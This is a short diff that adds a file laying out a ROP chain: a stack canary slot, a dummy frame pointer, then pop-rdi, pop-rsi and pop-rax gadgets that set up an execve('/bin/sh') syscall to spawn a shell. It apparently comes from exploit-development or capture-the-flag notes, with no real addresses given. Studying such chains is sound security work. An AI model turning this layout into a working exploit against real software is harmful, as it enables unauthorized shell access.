@@ -1,0 +1,9 @@
+canary
+dummy
+pop rdi ret
+/bin/sh
+pop rsi ret
+0
+pop rax ret
+59
+syscall
